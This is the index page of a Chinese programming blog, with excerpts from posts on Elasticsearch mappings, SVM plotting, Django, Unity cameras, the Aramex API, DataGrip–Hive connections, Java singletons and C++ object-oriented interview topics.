<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0947c9f429cc5b29fc138caa4b08a5f9/" rel="bookmark">
			Mapping映射入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是mapping映射 概念：自动或手动为index中的_doc建立的一种数据结构和相关配置，简称为mapping映射。
插入几条数据，让es自动为我们建立一个索引
PUT /website/_doc/1 { "post_date": "2019-01-01", "title": "my first article", "content": "this is my first article in this website", "author_id": 11400 } PUT /website/_doc/2 { "post_date": "2019-01-02", "title": "my second article", "content": "this is my second article in this website", "author_id": 11400 } PUT /website/_doc/3 { "post_date": "2019-01-03", "title": "my third article", "content": "this is my third article in this website", "author_id": 11400 } 对比数据库建表语句
create table website( post_date date, title varchar(50), content varchar(100), author_id int(11) ); 动态映射：dynamic mapping，自动为我们建立index，以及对应的mapping，mapping中包含了每个field对应的数据类型，以及如何分词等设置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0947c9f429cc5b29fc138caa4b08a5f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a02a309521012a9ecb47bbc20154fd61/" rel="bookmark">
			机器学习SVM高斯核函数作业中使用python等高线图可视化决策边界
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		svc = svm.SVC(C=100, kernel='rbf', gamma=10, probability=True) svc.fit(data[['X1', 'X2']], data['y']) svc.score(data[['X1', 'X2']], data['y']) predict_prob = svc.predict_proba(data[['X1', 'X2']])[:, 0] print(predict_prob.shape) #决策边界 axis=[0, 1, 0.3,1]#初始化点集 x0,x1=np.meshgrid( np.linspace(axis[0], axis[1], int((axis[1]-axis[0])*100)).reshape(-1, 1), np.linspace(axis[2], axis[3], int((axis[3]-axis[2])*100)).reshape(-1, 1) ) X_new = np.c_[x0.ravel(), x1.ravel()] #c_[]将两个数组以列的形式拼接起来，形成矩阵。 y_predict = svc.predict(X_new) zz = y_predict.reshape(x0.shape)#预测结果 fig, ax = plt.subplots(figsize=(8,6)) ax.contourf(x0, x1, zz, linewidths=5)#等高线图需要放在点图前面否则会覆盖 ax.scatter(data['X1'], data['X2'], s=30, c=predict_prob, cmap='Reds') plt.show() 效果：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac66fcb36a2db509877fb6f9c7343e8e/" rel="bookmark">
			django HttpResponse 自动辨别文件类型并添加content_type
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决如下问题:传输的文件不是固定的,需要动态辨别文件类型并添加content_type
代码示例:
file_name = os.path.basename(file_name) # file_name为文件的名称 content_type = mimetypes.guess_type(file_name)[0] # 获取需要的content_type信息 response = HttpResponse(wrapper, content_type=content_type) # 响应信息 标准库地址点我
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96195dbf8a4c9113d619b074287e4de0/" rel="bookmark">
			Unity3d Camera 讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 摄像机组件
照相机是玩家观察世界的装置，屏幕空间点按像素定义，屏幕的左下为（0,0）；右上是（pixelwidth，pixelHeight），z位置在照相机的世界单位中。
相机组件
Clear Flags ： 清除标识：确定了屏幕哪些部分将被清除，方便多个摄像机画不同的游戏元素 Background:背景色 Culling Mask:包含或省略要由相机呈现的对象层。在检查器中将图层分配给您的对象。 Projection: 切换相机的功能来模拟透视。 Perspective(透视): 相机将完整地呈现透视物体。拍摄角度为0-180°（最高） Field of View: 设置为“正交”时，“相机”的视口大小。 Orthographic(正交): 相机将统一渲染对象，没有视角。注：正交模式下不支持延迟渲染。正向渲染总是被使用。 Size:设置为“正交”时，“相机”的视口大小。 Cliping Planes:从相机到开始和停止渲染的距离。 Near ：相对于相机的最近点将出现绘图。 Far ：相对于相机的最远点将出现绘图。 ViewportRect：视口矩形 四个值指示屏幕上的相机视图将被绘制的位置。在视口坐标中测量（值为0-1）。 Depth:相机的位置按照画图顺序。具有较大值的相机将被绘制在具有较小值的相机之上。 Rendering Path:用于定义相机将使用什么渲染方法的选项 渲染路径 ：定义什么绘制方法被用于相机的选项 Use Graphics Settings 使用玩家设置：在玩家设置（Player Settings.）相机使用哪个渲染路径。 Forward 正向渲染：所有对象每材质渲染只渲染一次,快速渲染 Deferred 延迟照明：所有物体将在无光照的环境渲染一次，然后在渲染队列尾部将物体的光照一起渲染出来。 Legacy Vertex Lit 顶点光照 ：所有被这个相机渲染的物体都将渲染成Vertex-Lit物体。 Legacy Deferred : 旧的延迟光照 Target Texture : 目标纹理:渲染纹理 （Render Texture）包含相机视图输出。这会使相机渲染在屏幕上的能力被禁止。可用于实现画中画或者画面特效。 Occlusion Culling : 是否剔除物体背向摄像机的部分 Allow HDR:高动态光照渲染，启动相机高动态范围渲染功能。让场景更真实。 Allow MSAA: 这台相机应该使用MSAA渲染目标吗？如果当前质量设置MSAA级别支持，将只使用MSAA。 Allow Dynamic Resolution：动态分辨率缩放。 如果相机使用动态分辨率渲染，则为true，否则为false。即使此属性为true，动态分辨率也只能在当前图形设备支持的情况下使用。 Target Display:设置此摄像机的目标显示。 此设置使摄像机呈现在指定的显示中。显示器（例如监视器）支持的最大数目是8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96195dbf8a4c9113d619b074287e4de0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddb8de713ac384034399d329ae12497c/" rel="bookmark">
			php Aramexs 物流 createShipments
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用 php对接 Aramexs 物流 一、打开 Aramexs 官网 https://www.aramex.com/sa/en/aramex-home，并注册账号
二、注册后，设置一下自己是发货地址（地址记得用国际的国家编码哦）
三、熟悉开发者文档，由于业务需要，只对接了发货（createShipments），其他功能未对接
https://www.aramex.com/docs/default-source/resourses/resourcesdata/shipping-services-api-manual.pdf
四、通过github获取一下大佬代码 https://github.com/hakanersu/amaran-laravel
在大佬的基础上，调整了一下
https://github.com/yanggcn/php-aramex
五、上代码
/** * Notes:发货 * Interface：createShipment * @return array */ public function createShipment(){ $result = Aramex::createShipment([ 'shipper' =&gt; [ 'name' =&gt; 'SA',//发货人地址 与你填写的地址保持一致哦 'email' =&gt; 'email@users.companies',//邮箱 'phone' =&gt; '+123456789982',//电话 'cell_phone' =&gt;'+123456789982',//电话 'country_code' =&gt; 'SA',//国家编码 'city' =&gt; 'SA',//测试 'zip_code' =&gt; '',//邮编 'line1' =&gt; '',//发货地址 /* 'line2' =&gt; '', 'line3' =&gt; ' ',*/ ], 'consignee' =&gt; [//收货人信息 'name' =&gt; 'Steve', 'email' =&gt; 'email@users.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddb8de713ac384034399d329ae12497c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ba2bafee319419bd60ae9ad1f54f3ac/" rel="bookmark">
			uniapp修改radio的样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		uniapp原生的radio是有样式的，勾勾样式
radio的默认颜色，在不同平台不一样。微信小程序是绿色的，字节跳动小程序为红色，其他平台是蓝色的。更改颜色使用color属性。 用官网的实例来，源码如下：
&lt;radio-group @change="radioChange"&gt; &lt;label class="uni-list-cell uni-list-cell-pd" v-for="(item, index) in items" :key="item.value"&gt; &lt;view&gt; &lt;radio :value="item.value" :checked="index === current" /&gt; &lt;/view&gt; &lt;view&gt;{{item.name}}&lt;/view&gt; &lt;/label&gt; &lt;/radio-group&gt; js代码如下：
export default { data() { return { items: [{ value: 'USA', name: '美国' }, { value: 'CHN', name: '中国', checked: 'true' }, { value: 'BRA', name: '巴西' }, { value: 'JPN', name: '日本' }, { value: 'ENG', name: '英国' }, { value: 'FRA', name: '法国' }, ], current: 0 } }, methods: { radioChange: function(evt) { for (let i = 0; i &lt; this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ba2bafee319419bd60ae9ad1f54f3ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/779b3ec4deaf4203407f37d8aa0ddf97/" rel="bookmark">
			[转]MATLAB 主要函数指令表（按功能分类）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 常用指令(General Purpose Commands)
1.1 通用信息查询(General information)
demo 演示程序
help 在线帮助指令
helpbrowser 超文本文档帮助信息
helpdesk 超文本文档帮助信息
helpwin 打开在线帮助窗
info MATLAB 和MathWorks 公司的信息
subscribe MATLAB 用户注册
ver MATLAB 和TOOLBOX 的版本信息
version MATLAB 版本
whatsnew 显示版本新特征
1.2 工作空间管理(Managing the workspace)
clear 从内存中清除变量和函数
exit 关闭MATLAB
load 从磁盘中调入数据变量
pack 合并工作内存中的碎块
quit 退出MATLAB
save 把内存变量存入磁盘
who 列出工作内存中的变量名
whos 列出工作内存中的变量细节
workspace 工作内存浏览器
1.3 管理指令和函数(Managing commands and functions)
edit 矩阵编辑器
edit 打开M 文件
inmem 查看内存中的P 码文件
mex 创建MEX 文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/779b3ec4deaf4203407f37d8aa0ddf97/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/337fffd30dbf7e1bb77743bac640caa4/" rel="bookmark">
			利用re模块去除代码块注释——Python开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用re模块去除代码块注释——Python开发 文章目录 利用re模块去除代码块注释——Python开发前言知识点re文件 核心代码操作流程code（Python）完整 前言 上次做了用于输入样例格式修改，相当于测试用例的过滤器，这次我们使用类似的思路来做一个对于像C++代码中块注释的过滤器。
/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */ 观察上述代码，这是我从一道leetocde题目给的代码复制下来的，这是一个结构体的定义，语言是c++，对于这种块注释我们把它放在visual studio 2022 中，使用取消注释时，这些*还会保留，有时候一个个清除过于麻烦。所以，我们可以利用python的re模块实现对这种讨厌注释块的过滤，保留像结构体这种有意义的信息。
知识点 基本上和上次差不多，这里再简单回顾一下。
re re模块主要是python 中集成正则表达式的模块，功能主要是字符串的匹配。
这里用到了三个re函数
re.complie(): 生成正则表达式对象
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/337fffd30dbf7e1bb77743bac640caa4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d90d1c57a5dc03d22e6aa1baa1ff9af9/" rel="bookmark">
			图像检测系列之（12）异常检测（13）拼接伪造（14）deepfake | ICCV2021生成对抗GAN汇总梳理...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（1）GAN改进系列 | 最新ICCV2021生成对抗网络GAN论文梳理汇总
图像编辑系列之（2）基于StyleGAN（3）GAN逆映射（4）人脸 （5）语义生成 | ICCV2021生成对抗GAN梳理汇总
图像恢复系列之（6）超分（7）反光去除（8）光斑去除 （9）阴影去除（10）水下图像失真去除 | ICCV2021生成对抗GAN
图像恢复系列（11）之修复（inpainting） | 最新ICCV2021生成对抗网络GAN论文梳理汇总
十二、图像检测-异常检测 35 Learning Unsupervised Metaformer for Anomaly Detection 图像异常检测 (Anomaly detection，AD) ，解决图像异常的分类或定位问题。本文解决基于重建的图像 AD 方法的两个关键问题，即模型适应性和重建差异性。前者将 AD 模型概括为处理广泛的对象类别，而后者为定位异常区域提供了有用的线索。
方法核心是一个无监督的通用模型，称为 Metaformer，利用元学习模型参数来实现高模型适应能力和实例感知注意力来强调用于定位异常区域的焦点区域，即探索 这些感兴趣区域的重建差距。用工业图像 MVTec AD 数据集上的 SOTA 结果证明方法有效性。
十三、图像检测-拼接伪造 36 Reality Transform Adversarial Generators for Image Splicing Forgery Detection and Localization 许多伪造图像在图像编辑工具和卷积神经网络 (CNN) 的帮助下变得越来越逼真，实际场景中，需要验证侦测这些伪造图像的能力。生成和检测伪造图像的过程与生成对抗网络 (GAN) 的原理类似。
由于伪造图像的修图过程需要抑制篡改伪影并保留结构信息，可视为图像风格变换，本文提出一种假到真变换的“生成器GT” ；为了检测篡改区域，还提出一种基于多解码器单任务策略的定位“生成器GM” 。通过对抗训练两个生成器，模拟伪造者和验证者之间的对抗。
十四、图像检测-deepfake 37 Artificial Fingerprinting for Generative Models: Rooting Deepfake Attribution in Training Data 生成对抗网络（ GANs ）的不断发展，逼真图像生成已达到一个新的质量水平。但这种深度伪造的恶意使用，引发人们对视觉错误信息的忧虑。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d90d1c57a5dc03d22e6aa1baa1ff9af9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bc7c4e94fdf330c6a1c407093383ba8/" rel="bookmark">
			全球历史气候数据分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 气候，包括温度、湿度、气压、风（包括风向和风速）、降水量、大气成分数及众多其他气象要素在很长时期（一般几十年以上）及特定区域内基于统计数据的综合概括描述；除了天气的“平均”外，还包括了天气的变化和极端情况，以及异常情况的发生，这里为大家分享一下全球的历史气候数据。
数据介绍 数据的下载网址为：Historical climate data — WorldClim 1 documentation，是1970-2000年的WorldClim 2.1版气候数据，此版本于2020年1月发布。
数据包含有最低、平均和最高温度、降水量、太阳辐射、风速、水汽压和总降水量的月度气候数据，还有19个“生物气候”变量。
数据以30秒(约1km2)到10分(约340km2)的四种空间分辨率提供，每次下载都是一个“zip”文件，其中包含12个GeoTiff(.tif) 文件，每个对应一年中的一个月（一月编号结尾为1；十二月编号结尾为12）。
下载的时候点击对应的框内的数据即可开始下载。
数据列表
气候变量数据 除了上面的数据，用户还可以在下面下载WorldClim第2版的标准(19)WorldClim生物气候变量，是1970-2000年的平均值，每次下载都是一个“zip”文件，其中包含19个GeoTiff (.tif) 文件，每个月一个变量，这些数据的也是从30秒到10分四种分辨率的栅格。
生物气候变量数据 高程数据 作为参考，该网站还提供了用于生成 WorldClim 2.1 的高程数据，这些数据来自SRTM高程数据。
高程数据 数据展示 将下载的tif文件加载到ArcGIS内，再调整一下配色，可以看到效果展示，如下图所示。
数据展示
数据运用 我们可以通过重分类工具，得到平均气温30℃以上的区域，如下图所示。
重分类结果
结语 以上就是全球历史气候数据的详细说明，主要包括了数据介绍、气候变量数据、高程数据、数据展示和数据运用等功能。
最后，如果您在工作中遇到与GIS相关的任何难题，请通过关注公众号“水经注GIS”并在后台留言告诉我们，我们将针对比较有典型性和代表性的问题提供解决方案，从而将我们“为您提供丰富的地图数据与专业的GIS服务”之宗旨落到实处！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/203e7651b085f5a130095f99b97bd106/" rel="bookmark">
			DataGrip连接Hive、Impala数据源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 最近在负责一款数据产品，因调试需要，得经常执行impala查询SQL。公司内部维护有一个Hive/Impala查询平台，本来可以使用多账户登录此查询平台：一个是自己的域账户，当然权限非常有限，很多表不可查询；另一个是report账户，相当于管理员账户。这肯定非常不安全，无论是从安全，还是数据资产等维度来讲。
故而，最近该查询平台增加登录验证码功能。即，根据域账户，把随机数字发到域账户对应的企微账户上。这就相当于禁用report账户。
需求 于是给自己这么一个需求，或者叫问题：作为宇宙第一的数据可视化查询工具，DataGrip支持Hive/Impala数据源吗？
解决 Hive 使用的DataGrip 2021.2版本，不算太老。这个原生支持：
OK，常规的配置用户名，密码，连接串URL，以及驱动信息。因为程序代码里面使用如下hive-jdbc：
&lt;dependency&gt; &lt;groupId&gt;org.apache.hive&lt;/groupId&gt; &lt;artifactId&gt;hive-jdbc&lt;/artifactId&gt; &lt;version&gt;2.1.1-cdh6.2.1&lt;/version&gt; &lt;/dependency&gt; 并且是可以成功连接到该Hive数据源的，故而配置驱动指向本地maven私服仓库：
结果报错，报错信息如下：
Driver class 'org.apache.hive.service.rpc.thrift.TCLIService$Iface' not found. 这是为啥？？
jar包里面没有这个类！！
通过jd-gui应用程序查看jar文件，确实没有此类。说明这个jar通过程序JDBC方式连接Hive数据源可以，但是通过DataGrip方式不行。
于是，考虑尝试使用DataGrip自带的自动下载驱动的功能，下载的驱动全都在此路径下面，C:\Users\awesome_me\AppData\Roaming\JetBrains\DataGrip2021.2\jdbc-drivers，至于我们现在配置的是hive数据源，故而具体路径是C:\Users\awesome_me\AppData\Roaming\JetBrains\DataGrip2021.2\jdbc-drivers\Hive\3.1.2。
点击Test Connection，结果报错，详细的报错信息：
[ 08S01] Could not open client transport with JDBC Uri: jdbc:hive2://111.222.333.444:10000/edw: Could not establish connection to jdbc:hive2://111.222.333.444:10000/edw: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=edw}) org.apache.hive.org.apache.thrift.TApplicationException: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=edw}). 参考：required-field-client-protocol-is-unset，意思是连接的Hive数据源版本太低，而我们使用的驱动版本太高。
解决方法只能是降低驱动版本，如果不知道数据源的Server版本，则需要联系数仓同事获取版本，或者一个个版本尝试。major.minor.fix，即 主版本号.次版本号.修订版本号，先尝试主版本号，其次是次版本号。
于是下载跟hive server版本适配的驱动，从maven：hive-jdbc下载即可:
还是不对？？报错信息依旧是：
Driver class 'org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/203e7651b085f5a130095f99b97bd106/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b37db02246e23ef25745228a9946332/" rel="bookmark">
			Android使用URLconnection下载文件getContentLength()为-1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​​​​​​​ 1.问题产生场景 1.）Android客户端需要更新APP,使用URLconnection下载最新的APP文件进行安装
/** * 文件下载 * @return */ private long download() { URLConnection connection = null; int bytesCopied = 0; try { connection = mUrl.openConnection(); //参照 https://blog.csdn.net/fighting_2017/article/details/93972909 connection.setDoOutput(true); int length = connection.getContentLength(); mOutputStream = new ProgressReportingOutputStream(mFile); publishProgress(0, length); bytesCopied = copy(connection.getInputStream(), mOutputStream); mOutputStream.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } return bytesCopied; } 2.解决思路 java使用URLconnection下载文件 getContentLength()为-1 的解决办法_Erorrs的博客-CSDN博客_getcontentlength于是参照了这位大佬博客分析原因是请求的类型有变化，我更改之后connection.getContentLength();任然返回 -1；
这说明我和他遇到的可能不是同一个问题(感谢分享)。
最后检查连接发现是URL中含有中文编码，同样的连接在浏览器上打开居然能下载(其实浏览器也对中文做了编码处理，而Android客户端可能不会去处理)。
参照这位大佬的博客的解决方案是：请求之前对URL进行编码Android url中文编码问题 - 狂奔的小狮子 - 博客园
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b37db02246e23ef25745228a9946332/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4841b326b09478e60f9d0f975280c82d/" rel="bookmark">
			Java单例模式的七种不同写法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java单例模式的不同写法 目录 Java单例模式的不同写法一、饿汉式二、饿汉式 (变种)三、懒汉式（线程安全）四、懒汉（非线程安全）五、静态内部类六、枚举七. 双重校验加锁 一、饿汉式 /** * 饿汉式 */ public class Singleton1 { private static final Singleton1 INSTANCE = new Singleton1(); // 类的外部禁止实例化 (如果使用反射, 还是可以实例化的) private Singleton1() {} // 提供一个获取类的实例的方法 public static Singleton1 getInstance() { return INSTANCE; } // 其他实例方法 public void method1() {} public void method2() {} } 简单方便. 启动时就实例化, 耗资源.
二、饿汉式 (变种) /** * 饿汉模式(变种) */ public class Singleton2 { private static final Singleton2 INSTANCE; // 和前一种写法类似, 只不过把类静态变量INSTANCE的实例化代码放在静态块中 static { INSTANCE = new Singleton2(); } // 构造方法设为private, 禁外部实例化此类 private Singleton2() {} // 对外提供一个获取实例的方法 public static Singleton2 getInstance() { return INSTANCE; } // 其他实例方法 public void method() {} } 优缺点同上, 只是实例化时, 利用了"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4841b326b09478e60f9d0f975280c82d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/412edb3b8d3bb782d804ce3c2d5f830c/" rel="bookmark">
			C/C&#43;&#43;面试：面向对象的三大特性是哪些
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向对象的三大特性是哪些 （1）封装：
将客观事务封装成抽象的类，而类可以都自己的数据和方法暴露给可信的类或者对象，对不可信的类或者对象进行信息隐藏通过这种⽅式，对象对内部数据提供了不同级别的保护，以防⽌程序中⽆关的部分意外的改变或错误的使⽤了对象的私有部分。 （2） 继承：
可以使用现有类的所有功能，并且无需重新编写原来的类就可以对功能进行扩展继承概念的实现⽅式有两类： 实现继承：实现继承是指直接使⽤基类的属性和⽅法⽽⽆需额外编码的能⼒。接⼝继承：接⼝继承是指仅使⽤属性和⽅法的名称、但是⼦类必需提供实现的能⼒。 （3）多态：
就是向不同的对象发送同⼀个消息，不同对象在接收时会产⽣不同的⾏为（即⽅法）。即⼀个接⼝，可以实现多种⽅法。多态与⾮多态的实质区别就是函数地址是早绑定还是晚绑定的。如果函数的调⽤，在编译器编译期间就可以确定函数的调⽤地址，并产⽣代码，则是静态的，即地址早绑定。⽽如果函数调⽤的地址不能在编译器期间确定，需要在运⾏时才确定，这就属于晚绑定。 什么是类的继承(is-a) 类和类之间的关系：
has-A包含关系：用来描述一个类由多个部件类构成，实现has-A关系用类的成员属性，即一个类的成员属性是另一个已经定义好的类use-A，一个类使用另一个类，通过类之间的成员函数相互联系，定义友元或者通过传递参数的方式来实现is-A：继承关系，关系具有传递性 继承相关概念：
所谓的继承就是一个类继承了另一个类的属性和方法，这个新的类包含了上一个类的属性和方法，被称为子类或者派生类，被继承的类被称为父类或者基类 继承的特点：
子类拥有父类的属性和方法子类可以拥有父类没有的属性和方法子类对象可以当做父类对象使用 什么是组合(has-a) 一个类里面的数据成员是另一个类的对象，即内嵌其他类的对象作为自己的成员创建组合类的对象：⾸先创建各个内嵌对象，难点在于构造函数的设计。创建对象时既要对基本类型的成员进⾏初始化，⼜要对内嵌对象进⾏初始化。建组合类对象，构造函数的执⾏顺序：先调⽤内嵌对象的构造函数，然后按照内嵌对象成员在组合类中的定义顺序，与组合类构造函数的初始化列表顺序⽆关。然后执⾏组合类构造函数的函数体，析构函数调⽤顺序相反。 类如何实现只能静态分配和只能动态分配 只能静态分配：把new、delete运算符重置为private属性只能动态分配：把构造、析构函数设置为protected 建立类的对象有两种方式：
静态建立：静态建立一个类对象，就是由编译器为对象在栈空间中分配内存动态建立，A *p = new A()：动态建立一个类对象，就是使用new运算符为对象在堆空间中分配内存。这个过程分为两步，第一步执行operator new()函数，在堆中搜索一块内存并进行分配；第二步调用类构造函数构造对象只有使用new运算符，对象才会被建立在堆上，因此只要限制new运算符就可以实现类对象只能建立在栈上。可以将new运算符设置为private 多态的实现 多态其实一般就是指继承+虚函数实现的动态，对于重载来说，实际上基于的原理是，编译器为函数⽣成符号表时的不同规则，重载只是⼀种语⾔特性，与多态⽆关，与⾯向对象也⽆关，但这⼜是 C++中增加的新规则，所以也算属于 C++，所以如果⾮要重载算是多态的⼀种，那就可以说：多态可以分为静态多态和动态多态。
静态多态其实就是重载，因为静态多态是指在编译时期就决定了调⽤哪个函数，根据参数列表来决定；动态多态是指通过⼦类重写⽗类的虚函数来实现的，因为是在运⾏期间决定调⽤的函数，所以称为动态多态， ⼀般情况下我们不区分这两个时所说的多态就是指动态多态。
动态多态的实现与虚函数表，虚函数指针相关。
静态绑定 VS 动态绑定 说起静态绑定和动态绑定，我们首先要知道静态类型和动态类型，静态类型就是它在程序被声明时所采用的类型，在编译期间确定，动态类型则是指“目前所指对象的实际类型”，在运行期间确定。
静态绑定，又叫做“早绑定”，绑定的是静态类型，所对应的函数或者属性依赖于对象的静态类型，发生在编译期间动态绑定，又叫做“玩绑定”，绑定的是动态类型，所对应的函数或者属性依赖于对象的静态类型，发生在运行期间 比如说，virtual函数是动态绑定的，非virtual函数是静态绑定的，缺省参数值也是静态绑定的。这里注意我们不应该重新定义继承而来的缺省参数，因为即使我们重新定义了，也不会其中。因为一个基类的指针指向一个派生类对象，在派生类的对象中针对虚函数的参数缺省值进行了重定义，但是缺省参数值是静态绑定的，静态绑定绑定的是静态类型相关的内容，所以对出现一种派生类的虚函数实现方式结合了基类的缺省参数值的调用效果，这个与所期望的效果不同。
静态联编和动态联编 在C++中，联编是指一个计算机程序的不同部分彼此关联的过程。按照联编所进行的阶段不同，可以分为静态联编和动态联编
静态联编是指联编⼯作在编译阶段完成的，这种联编过程是在程序运⾏之前完成的，⼜称为早期联编。要实现静态联编，在编译阶段就必须确定程序中的操作调⽤（如函数调⽤）与执⾏该操作代码间的关系，确定这种关系称为束定，在编译时的束定称为静态束定。静态联编对函数的选择是基于指向对象的指针或者引⽤的类型。其优点是效率⾼，但灵活性差。动态联编是指联编在程序运⾏时动态地进⾏，根据当时的情况来确定调⽤哪个同名函数，实际上是在运⾏时虚函数的实现。这种联编⼜称为晚期联编，或动态束定。动态联编对成员函数的选择是基于对象的类型，针对不同的对象类型将做出不同的编译结果。 C++中⼀般情况下的联编是静态联编，但是当涉及到多态性和虚函数时应该使⽤动态联编。动态联编的优点是灵活性强，但效率低。动态联编规定，只能通过指向基类的指针或基类对象的引⽤来调⽤虚函数，其格式为：指向基类的指针变量名-&gt;虚函数名（实参表）或基类对象的引⽤名.虚函数名（实参表）
实现动态联编三个条件：
必须把动态联编的⾏为定义为类的虚函数；类之间应满⾜⼦类型关系，通常表现为⼀个类从另⼀个类公有派⽣⽽来；必须先使⽤基类指针指向⼦类型的对象，然后直接或间接使⽤基类指针调⽤虚函数； 虚函数实现原理 ⾸先我们来说⼀下，C++中多态的表象，在基类的函数前加上 virtual 关键字，在派⽣类中᯿写该函数，运⾏时将会根据对象的实际类型来调⽤相应的函数。如果对象类型是派⽣类，就调⽤派⽣类的函数，如果是基类，就调⽤基类的函数。实际上，当一个类中包含虚函数时，编译器会为该类生成一个虚函数表，保存该类中的虚函数的地址。同样，派生类继承基类，派生类中自然一定有虚函数，所以编译器也会为派生类生成自己的虚函数表。当我们定义一个派生类对象时，编译器检测该类型有虚函数，所以为这个派生类对象生成一个虚函数指针，指向该类型的虚函数表，这个虚函数指针的初始化是在构造函数中完成的。后续如果有⼀个基类类型的指针，指向派⽣类，那么当调⽤虚函数时，就会根据所指真正对象的虚函数表指针去寻找虚函数的地址，也就可以调⽤派⽣类的虚函数表中的虚函数以此实现多态。补充：如果基类中没有定义成virtual，那么进⾏ Base B; Derived D; Base *p = D; p-&gt;function(); 这种情况下调⽤的则是 Base 中的 function()。因为基类和派生类中都没有虚函数的定义，那么编译器就会认为不要留给动态多态的机会，就事先进行函数地址的绑定（早绑定），具体过程就是，定义了一个派生类对象，首先要构造基类的空间，然后构造派生类的自身内容，形成一个派生类对象，那么在进行类型转换时，直接截取基类的部分的内容，编译器认为类型就是基类，那么（函数符号表［不同于虚函数表的另⼀个表］中）绑定的函数地址也就是基类中函数的地址，所以执⾏的是基类的函数。 编译器处理虚函数表应该如何处理 